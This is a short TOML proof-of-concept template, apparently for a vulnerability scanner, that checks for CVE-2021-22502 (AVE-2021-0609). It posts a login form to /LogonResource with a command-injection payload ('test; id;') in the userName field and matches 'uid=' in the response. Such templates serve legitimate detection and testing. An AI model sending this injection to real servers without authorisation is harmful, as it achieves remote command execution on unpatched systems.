[info]
author = "ave"
description = "AVE-2021-0609 verification"
id = "POC-AVE-2021-0609"
name = "PoC for AVE-2021-0609"
severity = "critical"
tags = ["ave-2021-0609"]
vuln_id = [
    "AVE-2021-0609",
    "CVE-2021-22502",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/LogonResource"
protocol = "http"

[poc.requests.body]
content = "userName=test%3B+id%3B&Password=test"
type = "form"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
